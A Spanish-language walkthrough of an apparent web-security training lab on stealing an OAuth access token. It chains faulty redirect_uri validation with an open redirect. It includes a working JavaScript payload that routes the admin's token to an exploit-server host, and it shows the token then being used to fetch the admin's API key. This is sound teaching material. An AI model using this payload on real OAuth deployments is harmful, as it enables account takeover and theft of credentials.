# 5. Robo de Tokens de Acceso OAuth a través de Open Redirect

## 🔁 **Robo de tokens de acceso OAuth a través de una redirección abierta**

### 📄 **Descripción del laboratorio**

Este laboratorio utiliza OAuth para permitir el inicio de sesión con cuentas de redes sociales.\
Una validación defectuosa del servicio OAuth, combinada con una **redirección abierta en la aplicación cliente**, permite filtrar **tokens de acceso OAuth** a ubicaciones arbitrarias.

🎯 **Objetivo:**\
Robar el **access token OAuth del usuario administrador**, utilizarlo para obtener su **API key** y enviarla como solución del laboratorio.

Condiciones del laboratorio:

* El administrador:
  * Tiene sesión activa en el proveedor OAuth
  * Abrirá cualquier cosa enviada desde el Exploit Server
* No es suficiente iniciar sesión como administrador para ver la API key
* Credenciales sociales del atacante:

```
wiener : peter
```

***

### 📚 Teoría

Este laboratorio explota una **cadena de dos vulnerabilidades**:

1. **Validación defectuosa del `redirect_uri`** en el servidor OAuth
2. **Open redirect interno** en la aplicación cliente

#### 📌 Flujo OAuth implicado

El flujo utilizado es el **Implicit Flow**, donde el proveedor OAuth devuelve directamente un **access token** en el fragmento de la URL:

```
#access_token=...
```

Características importantes del fragmento (`#`):

* No se envía al servidor
* Solo es accesible desde JavaScript en el navegador
* No aparece en logs HTTP salvo que se procese explícitamente

#### 📌 Fallos clave

* El proveedor OAuth:
  * ❌ No valida correctamente el `redirect_uri`
  * Permite añadir rutas extra tras el callback legítimo (`/../`)
* La aplicación cliente:
  * Contiene una redirección abierta (`/post/next?path=`)
  * Redirige a cualquier URL sin validar

Encadenando ambos fallos, podemos:

1. Forzar que el flujo OAuth termine en una **redirección abierta**
2. Redirigir finalmente al **Exploit Server**
3. Recibir el `access_token` en el navegador
4. Extraerlo con JavaScript y enviarlo a los logs

***

### 📝 Práctica

#### 1️⃣ Analizar el login OAuth normal

Iniciamos sesión con OAuth usando:

```
wiener : peter
```

Interceptamos el flujo con Burp Suite.\
Observamos la petición de autorización:

```
GET /auth?
client_id=...
&redirect_uri=https://ID-LAB.web-security-academy.net/oauth-callback
&response_type=token
&scope=openid profile email
```

***

#### 2️⃣ Probar manipulación del `redirect_uri`

Intentamos cambiar completamente el dominio del `redirect_uri` → no funciona.

Pero probamos algo distinto:

```
https://ID-LAB.web-security-academy.net/oauth-callback/../
```

<figure><img src="../../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

📌 Resultado:

* El proveedor OAuth **lo acepta**
* La ruta se normaliza y acaba en la raíz del sitio

El `redirect_uri` **no se valida correctamente**, solo se comprueba el prefijo.

***

#### 3️⃣ Encontrar un open redirect interno

Buscamos redirecciones dentro del blog.\
Encontramos la funcionalidad **Next post**:

```
/post/next?path=...
```

Probamos con:

```
/post/next?path=https://example.com
```

📌 Resultado:

* Redirige directamente a `example.com`

Confirmado: **open redirect interno**.

***

#### 4️⃣ Encadenar OAuth + open redirect

Construimos un `redirect_uri` malicioso combinando ambos fallos:

```
https://ID-LAB.web-security-academy.net/oauth-callback/../post/next?path=https://EXPLOIT-SERVER/exploit
```

<figure><img src="../../../.gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>

Esto provoca:

1. OAuth redirige al callback
2. Se hace `/../post/next`
3. El blog redirige a nuestro Exploit Server
4. El `access_token` queda en la URL del navegador

<figure><img src="../../../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>

***

#### 5️⃣ Preparar el exploit JavaScript

Problema:\
El token viene en un fragmento (`#access_token=...`), que **no se registra en los logs**.

Solución:\
Usar JavaScript para:

* Detectar si hay `#`
* Extraer el fragmento
* Convertirlo en query string (`/?access_token=...`)

Exploit final:

```html
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0a65005a042f2370810dfaf8024a0054.oauth-server.net/auth?client_id=wgjp157h2uf7jgix7jmiy&redirect_uri=https://0acb00ab04df230d81dffc3100b50017.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac600a8047423b58183fb21018b00bc.exploit-server.net/exploit/&response_type=token&nonce=-1076264756&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

<figure><img src="../../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>

Subimos el exploit al **Exploit Server** y pulsamos:

* **Store**
* **Deliver exploit to victim**

***

#### 6️⃣ Robo del access token del administrador

El administrador abre el exploit:

* Tiene sesión activa con el proveedor OAuth
* Se completa el flujo OAuth automáticamente
* El navegador termina en:

```
/?access_token=ADMIN_TOKEN
```

En los **Access logs** del Exploit Server vemos:

```
GET /?access_token=ADMIN_TOKEN
```

<figure><img src="../../../.gitbook/assets/image (262).png" alt=""><figcaption></figcaption></figure>

📌 Copiamos el token.

***

#### 7️⃣ Obtener la API key del administrador

El laboratorio expone el endpoint:

```
/me
```

Este endpoint devuelve los datos asociados al token OAuth.

Enviamos una petición autenticada usando el token robado:

```
GET /me
Authorization: Bearer ADMIN_TOKEN
```

<figure><img src="../../../.gitbook/assets/image (263).png" alt=""><figcaption></figcaption></figure>

📌 Respuesta:

* Datos del administrador
* **API key incluida**

Copiamos la API key.

***

#### 8️⃣ Resolver el laboratorio

Pegamos la API key en el formulario de solución del laboratorio.

✔️ Lab marcado como resuelto.
